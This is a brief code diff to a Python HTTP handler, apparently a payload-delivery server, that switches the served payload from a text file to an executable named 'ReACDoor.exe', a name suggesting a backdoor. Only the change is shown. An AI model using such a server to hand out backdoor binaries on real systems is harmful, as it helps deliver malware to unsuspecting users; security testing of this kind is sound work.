@@ -89,7 +89,7 @@ class RequestHandler(BaseHTTPRequestHandler):
 
 
     def servePayload(self):
-        self.serve_file(OUTPUT_DIR / "text.txt")
+        self.serve_file(OUTPUT_DIR / "ReACDoor.exe")
 
     def fallback(self):
         self.send_response(200)
